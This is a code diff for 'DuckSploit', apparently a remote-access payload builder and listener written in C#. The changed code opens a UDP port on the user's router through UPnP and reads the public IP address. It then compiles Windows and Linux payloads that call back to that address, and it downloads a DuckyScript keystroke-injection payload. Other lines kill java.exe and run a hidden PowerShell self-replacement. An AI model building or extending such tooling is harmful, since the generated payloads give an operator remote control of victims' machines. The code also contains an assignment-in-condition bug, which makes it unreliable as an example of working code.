@@ -197,27 +197,37 @@ namespace DSserver
 			process = Process.Start(processInfo);
 			process.WaitForExit();
 		}
+		public static INatDevice device;
+		public static bool ipchecked = false;
+		public static string GetPublicIP() {	
+			if(ipchecked = true)
+			{
+				public_ipv4 = device.GetExternalIP().ToString();
+				
+				return device.GetExternalIP().ToString();
+			}
+			else
+			{
+				return "";
+			}
+		}
 		public static void DeviceFound(object sender, DeviceEventArgs args)
-        {
-            INatDevice device = device = args.Device;
-            // device.CreatePortMap(new Mapping(Protocol.Udp, 53, 53));
-            device.CreatePortMap(new Mapping(Protocol.Udp, 45358, 45358));
-			public_ipv4 = device.GetExternalIP().ToString();
-        }
-        public static void DeviceLost(object sender, DeviceEventArgs args)
-        {
-            INatDevice device = args.Device;
-            // device.DeletePortMap(new Mapping(Protocol.Udp, 53, 53));
-            device.DeletePortMap(new Mapping(Protocol.Udp, 45358, 45358));
-            // on device disconnect code
-        }
+		{
+			device = args.Device;
+			ipchecked = true;
+			
+			if(GetPublicIP().Length == 0)
+			{
+				sendmsg("[x] Error: can't get public ip", "red");
+				Console.ReadKey();
+			}
+			
+			device.CreatePortMap(new Mapping(Protocol.Udp, 45358, 45358));
+		}
         static void Main(string[] args)
         {
 			NatUtility.DeviceFound += DeviceFound;
 			NatUtility.StartDiscovery();
-			
-			
-			
 			
 			
 			exec_cmd("start cmd.exe /c taskkill /IM java.exe /f");
@@ -281,6 +291,7 @@ namespace DSserver
 				sendmsg("                                               88                              ", "green");
 				sendmsg("                                               dP                              ", "green");
 				sendmsg("                            | DuckSploit V1.0.9 |                         ", "green");
+				sendmsg("                              build version: _5                         ", "yellow");
 				
 				if (android == true)
 				{
@@ -500,15 +511,17 @@ namespace DSserver
 						if(menu2 == "1")
 						{
 							//windows payload
+							Console.WriteLine("PublicIP: "+GetPublicIP());
 							Console.Clear();
 							compiler compiler = new compiler();
-							compiler.compile("win", public_ipv4);
+							compiler.compile("win", GetPublicIP());
 							b = 1;
 							Console.ReadKey();
 						}
 						else if(menu2 == "2")
 						{
 							// linux payload
+							Console.WriteLine("PublicIP: "+GetPublicIP());
 							Console.Clear();
 							Console.WriteLine("Not avaliable");
 							b = 1;
@@ -516,6 +529,7 @@ namespace DSserver
 						}
 						else if(menu2 == "3")
 						{
+							Console.WriteLine("PublicIP: "+GetPublicIP());
 							// android payload
 							Console.Clear();
 							if (Directory.Exists(@"C:\\Program Files\\Java")) {
@@ -608,9 +622,10 @@ namespace DSserver
 								string menu3 = Console.ReadLine(); 
 								if(menu3 == "1")
 								{
+									Console.WriteLine("PublicIP: "+GetPublicIP());
 									Console.Clear();
 									compiler compiler = new compiler();
-									compiler.compile("win", public_ipv4);
+									compiler.compile("win", GetPublicIP());
 									Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/payloads/payload.dd", dir + "\\generated\\payload.dd");
 									sendmsg("DuckyScript payload is generated", "yellow");
 									sendmsg("Can be found at: " + dir + "\\generated\\payload.dd", "yellow");
@@ -619,9 +634,10 @@ namespace DSserver
 								}
 								if(menu3 == "2")
 								{
+									Console.WriteLine("PublicIP: "+GetPublicIP());
 									Console.Clear();
 									compiler compiler = new compiler();
-									compiler.compile("lin", public_ipv4);
+									compiler.compile("lin", GetPublicIP());
 									d = 1;
 									Console.ReadKey();
 								}
@@ -690,8 +706,8 @@ namespace DSserver
 					sendmsg("[~] Fetching data..", "yellow");
 					ProcessStartInfo processInfo;
 					Process process;
-					processInfo = new ProcessStartInfo("cmd.exe", "/c start powershell.exe -WindowStyle hidden Start-Sleep 10 & del /q /f "+tempdir+"\\DuckSploit\\ds.exe & copy /y \""+tempdir+"\\newds.exe\" \""+userprofile+"\\DuckSploit\\ds.exe\"");
-					// Console.WriteLine("Start-Sleep 10 & del /q /f "+tempdir+"\\DuckSploit\\ds.exe & copy /y \""+tempdir+"\\newds.exe\" \""+userprofile+"\\DuckSploit\\ds.exe\"");
+					processInfo = new ProcessStartInfo("cmd.exe", "/c start powershell.exe -WindowStyle hidden Start-Sleep 3 & del /q /f "+userprofile+"\\DuckSploit\\ds.exe & copy /y \""+tempdir+"\\newds.exe\" \""+userprofile+"\\DuckSploit\\ds.exe\"");
+					Console.WriteLine("Start-Sleep 10 & del /q /f "+userprofile+"\\DuckSploit\\ds.exe & copy /y \""+tempdir+"\\newds.exe\" \""+userprofile+"\\DuckSploit\\ds.exe\"");
 					processInfo.CreateNoWindow = false;
 					processInfo.UseShellExecute = true;
 					processInfo.RedirectStandardOutput = false;
